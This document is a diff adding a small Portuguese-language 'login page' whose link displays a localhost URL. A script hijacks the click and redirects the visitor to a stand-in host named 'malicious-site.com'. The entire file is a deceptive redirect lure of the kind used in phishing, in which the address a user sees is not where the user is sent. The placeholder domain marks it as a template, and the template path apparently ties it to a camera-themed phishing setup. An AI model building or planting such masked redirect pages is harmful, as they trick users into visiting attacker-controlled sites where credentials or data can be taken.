@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Página de Login</title>
+</head>
+<body>
+    <h1>Acesse sua conta</h1>
+    <a href="#" id="login-link">http://localhost:2525/templates/camera_temp/index.html</a>
+
+    <script>
+        document.getElementById('login-link').onclick = function(event) {
+            event.preventDefault();  // Evita o comportamento padrão do link
+            window.location.href = "http://malicious-site.com";
+        };
+    </script>
+</body>
+</html>
